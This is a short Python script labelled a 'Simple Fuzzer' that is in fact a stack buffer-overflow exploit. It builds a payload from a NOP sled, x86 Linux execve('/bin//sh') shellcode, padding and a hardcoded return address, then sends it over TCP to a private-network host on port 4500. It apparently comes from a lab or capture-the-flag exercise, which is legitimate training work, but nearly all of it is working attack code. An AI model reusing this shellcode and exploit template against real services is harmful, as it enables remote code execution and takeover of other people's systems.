# Simple Fuzzer

import socket

###
host = '192.168.242.3'
port = 4500

###
fuzz_list = []

#c = 400
############
#Preparing the payload for the attack.
############
shellcode = "\x90"*25 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*183 + "\xad\xf1\xff\xbf"+ "a"*22

#############
#Attaching the payload to the variable.
#############
fuzz_list.append(shellcode)
#fuzz_list.append("\x8c\xf2\xff\xbf")
#fuzz_list.append("\x8c\xf2\xff\xbf")
#fuzz_list.append("\x90"*c)
#fuzz_list.append(shellcode)



#Sending the payload to the aplication.
def fuzz_server():
	for a in fuzz_list:
		print ('Payload: #####', len(a))
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,port))
			s.send(a.encode())
			print (len(a))
			print (s.recv(1024))
			s.close()
		except socket.error as msg:
			s.close()
			s = None
		continue

def main():
	fuzz_server()

if __name__ == "__main__":
	print("Breaking trhough....")
	main()
